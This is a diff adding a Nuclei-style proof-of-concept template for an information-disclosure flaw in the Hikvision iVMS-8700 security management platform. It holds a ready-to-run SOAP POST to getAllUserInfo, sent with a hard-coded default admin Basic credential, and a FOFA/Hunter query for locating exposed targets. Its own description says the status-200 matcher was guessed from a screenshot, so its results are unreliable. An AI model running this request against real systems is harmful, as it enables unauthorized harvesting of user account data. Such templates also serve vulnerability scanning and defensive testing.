@@ -1,0 +1,21 @@
+id: poc-df3241a54958ae4c65f9
+info:
+  name: 海康威视iVMS-8700综合安防管理平台getAllUserInfo存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/df3241a54958ae4c65f904ad8f46bcce
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: df3241a54958ae4c65f904ad8f46bcce
+    fofa: + hunter：`web.body="/views/home/file/installPackage.rar"`
+http:
+- raw:
+  - "POST /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\nContent-Length: 569\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nAuthorization: Basic YWRtaW46MTIzNDU2\nConnection: close\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:impl=\"http://impl.ws.api.base.cms.hikvision.com\" xmlns:xsd=\"http://ws.common.cms.hikvision.com/xsd\">\n<soapenv:Header/>\n<soapenv:Body>\n    <impl:getAllUserInfo>\n        <impl:request>\n            <!--type: int-->\n            <xsd:pageNo>1</xsd:pageNo>\n\n            <!--type: int-->\n            <xsd:pageSize>1</xsd:pageSize>\n\n        </impl:request>\n\n        <!--type: long-->\n        <impl:updTime></impl:updTime>\n\n    </impl:getAllUserInfo>\n\n</soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
